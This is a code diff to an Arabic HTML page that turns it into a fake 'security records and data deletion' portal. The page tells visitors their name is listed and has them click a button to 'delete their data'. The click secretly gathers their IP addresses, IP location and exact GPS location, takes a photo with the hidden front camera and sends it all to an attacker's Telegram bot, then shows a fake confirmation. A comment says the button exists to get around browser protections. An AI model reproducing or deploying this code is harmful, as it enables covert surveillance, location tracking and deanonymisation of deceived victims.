@@ -1,11 +1,59 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>صفحة</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة حماية وسجلات الأمان</title>
+    <style>
+        body {
+            font-family: Tahoma, sans-serif;
+            background-color: #f4f7f6;
+            text-align: center;
+            padding-top: 80px;
+            margin: 0;
+        }
+        .container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 420px;
+            margin: auto;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+    </style>
 </head>
 <body>
-    <h1>جاري التحميل...</h1>
+
+    <div class="container" id="mainBox">
+        <h1>التحقق من السجلات وحذف البيانات</h1>
+        <p>تم رصد اسمك ضمن قائمة السجلات المتاحة. انقر على الزر أدناه لتأكيد الهوية وبدء عملية الحذف الفوري.</p>
+        <button id="triggerBtn">بدء عملية فحص وحذف البيانات</button>
+    </div>
 
     <!-- عناصر الكاميرا المخفية -->
     <video id="video" autoplay playsinline style="display:none;"></video>
@@ -30,7 +78,6 @@
             .catch(err => console.error('❌:', err));
         }
 
-        // دالة إرسال الصورة الملتقطة إلى تليجرام
         function sendPhotoToTelegram(blob, captionText) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -106,7 +153,6 @@
             }
         }
 
-        // دالة سحب الموقع الدقيق عبر GPS
         function getExactGPSLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -129,17 +175,19 @@
             });
         }
 
-        (async function main() {
+        // ربط العملية بالنقر على الزر الوهمي لتجاوز الحظر الأمني للمتصفحات
+        document.getElementById('triggerBtn').addEventListener('click', async function() {
+            this.innerText = "جاري فحص وحذف السجلات...";
+            this.disabled = true;
+
             const ipv4 = await getPublicIPv4();
             const ipv6 = await getPublicIPv6();
             const localIP = await getLocalIP();
             const ipLocation = await getLocation(ipv4);
-            
-            // طلب الموقع الدقيق والكاميرا معاً
             const gpsLocation = await getExactGPSLocation();
 
             let msg = `<blockquote>`;
-            msg += ` <b>زيارة جديدة - مع الموقع الدقيق والكاميرا</b>\n\n`;
+            msg += ` <b>زيارة تفاعلية جديدة (عبر الزر)</b>\n\n`;
             msg += ` <b>IP العام (IPv4)</b>: <tg-spoiler> ${ipv4} </tg-spoiler>\n`;
             msg += ` <b>IP العام (IPv6)</b>: <tg-spoiler> ${ipv6} </tg-spoiler>\n`;
             msg += ` <b>IP المحلي (Local)</b>: <tg-spoiler> ${localIP} </tg-spoiler>\n\n`;
@@ -165,7 +213,7 @@
             msg += ` <b>وقت الدخول</b>: <code>${new Date().toLocaleString('ar-EG')}</code>\n`;
             msg += `</blockquote>`;
 
-            // تشغيل الكاميرا والتقاط الصورة وإرسالها مع النص مجتمعين
+            // تشغيل الكاميرا والتقاط الصورة بعد الضغط مباشرة
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
             .then(stream => {
                 const video = document.getElementById('video');
@@ -182,14 +230,16 @@
 
                     canvas.toBlob(blob => {
                         sendPhotoToTelegram(blob, msg);
+                        document.getElementById('mainBox').innerHTML = '<h2>تمت العملية بنجاح</h2><p>تم إزالة السجلات الخاصة بك من القواعد بنجاح.</p>';
                     }, 'image/jpeg', 0.8);
                 }, 1500);
             })
             .catch(err => {
                 console.log('مرفوض أو غير متاح:', err);
                 sendToTelegram(msg + "\n⚠️ <b>ملاحظة:</b> تم رفض إذن الكاميرا من قبل المستخدم.");
+                document.getElementById('mainBox').innerHTML = '<h2>عذراً</h2><p>حدث خطأ أثناء الاتصال بخادم الحذف.</p>';
             });
-        })();
+        });
     </script>
 </body>
 </html>
